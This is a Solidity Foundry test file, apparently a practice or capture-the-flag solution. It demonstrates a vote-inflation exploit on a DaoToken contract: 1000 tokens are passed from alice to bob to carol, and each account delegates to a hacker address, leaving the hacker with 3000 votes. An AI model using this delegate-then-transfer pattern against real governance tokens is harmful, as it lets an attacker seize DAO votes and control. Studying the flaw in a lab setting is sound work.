// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "contracts/hack/governance/DaoToken.sol";

contract exploitTest is Test {
	DaoToken daoToken;
	address public owner = address(0);
	address public hacker =address(1337);

	address public alice= address(1);
	address public bob = address(2);
	address public carol = address(3);

	function setUp() public {
		vm.startPrank(owner);
		daoToken = new DaoToken();
		daoToken.mint(alice, 1000);
		vm.stopPrank();
  }

	function testExploit() public {
    vm.startPrank(alice);
    //hacker control alice account to delegates vote power to himself, so he can create a proposal or vote on a proposal
    daoToken.delegate(hacker);
    //transfer 1000 tokens to other dao member (bob, Carol)
    daoToken.transfer(bob, 1000);
    vm.startPrank(bob);
    // control bob account to delegates more vote power to hacker himself, repeat the same process for Carol
    daoToken.delegate(hacker);
    daoToken.transfer(carol, 1000);

    vm.startPrank(carol);
    daoToken.delegate(hacker);


    // now hacker should has 3000 votes, hacker also wanna transfer 1000 tokens to himself
    daoToken.transfer(hacker, 1000);
    vm.stopPrank();

	uint hacker_vote = daoToken.getVotes(hacker);
    console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

	uint hacker_balance= daoToken.balanceOf(hacker);
    console.log("Hacker's daoToken after the attack: %s: ", hacker_balance);

	assertEq(hacker_vote , 3000);
	assertEq(hacker_balance, 1000);
    }

}
